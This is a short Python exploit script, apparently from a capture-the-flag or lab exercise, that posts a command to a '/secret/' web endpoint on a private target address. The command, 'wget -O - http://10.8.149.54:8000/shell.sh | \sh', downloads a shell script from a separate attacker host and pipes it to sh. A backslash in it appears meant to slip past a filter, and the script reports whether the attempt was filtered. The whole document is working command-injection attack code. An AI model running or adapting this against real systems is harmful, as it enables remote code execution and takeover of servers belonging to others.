import requests
from bs4 import BeautifulSoup

url = "http://10.10.181.31/secret/"

command = "wget -O - http://10.8.149.54:8000/shell.sh | \sh"
data = {'command': command}

s = requests.Session()
r = s.post(url=url, data=data)

soup = BeautifulSoup(r.text, "html.parser")
aux = soup.find("h2")

# checks if aux is valid and if the aux.text is a valid response
if aux is not None and aux.text:
	print(aux.text)
elif aux is None:
	print("filtered")
else:
	print("failed")
